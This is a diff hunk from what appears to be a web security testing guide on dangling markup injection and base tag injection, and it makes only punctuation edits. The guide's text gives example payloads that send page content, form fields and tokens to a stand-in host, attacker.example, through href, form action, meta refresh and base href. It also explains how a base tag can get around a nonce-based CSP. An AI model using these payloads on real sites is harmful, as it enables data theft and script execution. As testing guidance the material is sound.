@@ -81,13 +81,13 @@ The browser reads everything up to the next `'` in the page as part of the URL, 
 
 Chromium-based browsers block resource URLs that contain both a raw newline and `<`, which stops the simplest form of this when the captured text spans several lines. Browsers handle other elements differently, so try several and test in more than one browser:
 
-- `<a href='https://attacker.example/?` or `<form action='https://attacker.example/?`, which need the user to click or submit;
+- `<a href='https://attacker.example/?` or `<form action='https://attacker.example/?`, which need the user to click, or submit;
 - `<meta http-equiv="refresh" content='0;url=https://attacker.example/?`, which navigates without a click;
 - an injected `<form>` with no closing tag, placed before a legitimate form, so the legitimate form's fields and token are submitted to the attacker's `action`.
 
 #### Base Tag Injection
 
-An injected `<base href="https://attacker.example/">` changes how every relative URL after it is resolved. Relative script sources, form actions and links then point to the attacker's server. With a nonce-based CSP, an existing script tag that carries a valid nonce and a relative `src` loads from the attacker's server and runs, which turns markup injection into script execution. Check whether the page loads scripts or submits forms with relative URLs after the injection point, and whether the CSP sets `base-uri`.
+An injected `<base href="https://attacker.example/">` changes how every relative URL after it is resolved. Relative script sources, form actions, and links then point to the attacker's server. With a nonce-based CSP, an existing script tag that carries a valid nonce and a relative `src` loads from the attacker's server and runs, which turns markup injection into script execution. Check whether the page loads scripts or submits forms with relative URLs after the injection point, and whether the CSP sets `base-uri`.
 
 ## Related Test Cases
 
